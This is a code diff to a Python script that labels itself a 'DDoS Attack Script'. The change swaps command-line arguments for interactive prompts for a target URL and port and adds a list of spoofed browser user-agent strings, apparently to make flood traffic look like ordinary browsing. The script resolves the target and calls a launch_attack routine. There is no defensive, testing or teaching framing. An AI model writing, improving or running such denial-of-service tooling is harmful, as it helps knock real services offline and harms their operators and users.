@@ -5,7 +5,6 @@ import random
 import logging
 from queue import Queue
 from time import sleep
-import argparse
 from urllib.parse import urlparse
 
 # Setup logging
@@ -72,25 +71,38 @@ def launch_attack(target_ip, target_port):
     queue.join()
 
 if __name__ == "__main__":
-    # Parse command-line arguments
-    parser = argparse.ArgumentParser(description="DDoS Attack Script")
-    parser.add_argument("target_url", help="Target URL")
-    parser.add_argument("target_port", type=int, help="Target port")
-    args = parser.parse_args()
+    # Define user agents list
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
+        # Add more user agents as needed
+    ]
 
     # Clear the terminal screen
     os.system('cls' if os.name == 'nt' else 'clear')
 
+    # Input mode for URL and port
+    target_url = input("Enter target URL: ")
+    target_port = int(input("Enter target port: "))
+
     # Extract hostname from URL
-    parsed_url = urlparse(args.target_url)
+    parsed_url = urlparse(target_url)
     hostname = parsed_url.hostname
 
     # Resolve URL to IP address
     try:
         target_ip = socket.gethostbyname(hostname)
     except socket.gaierror as e:
-        logging.error(f"Error resolving URL {args.target_url}: {e}")
+        logging.error(f"Error resolving URL {target_url}: {e}")
         exit(1)
 
     # Launch attack
-    launch_attack(target_ip, args.target_port)
+    launch_attack(target_ip, target_port)
